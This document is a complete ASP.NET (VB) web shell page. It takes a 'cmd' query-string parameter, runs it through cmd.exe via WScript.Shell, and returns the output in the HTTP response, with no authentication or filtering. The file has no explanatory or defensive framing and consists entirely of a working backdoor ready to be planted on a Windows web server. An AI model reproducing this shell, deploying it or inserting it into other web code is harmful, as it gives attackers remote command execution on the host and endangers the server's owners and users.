<%@ Page Language="VB" %>
<%
Dim command As String = Request.QueryString("cmd")
If Not String.IsNullOrEmpty(command) Then
    Try
        ' 使用CreateObject创建 WScript.Shell 对象
        Dim shell As Object = CreateObject("WScript.Shell")
        Dim exec As Object = shell.Exec("cmd.exe /c " & command)
        Dim stdout As Object = exec.StdOut
        Dim output As String = ""
        While Not stdout.AtEndOfStream
            output &= stdout.ReadLine() & vbCrLf
        End While
        Response.Write(output)
    Catch ex As Exception
        Response.Write("Error: " & ex.Message)
    End Try
Else
    Response.Write("No command")
End If
%>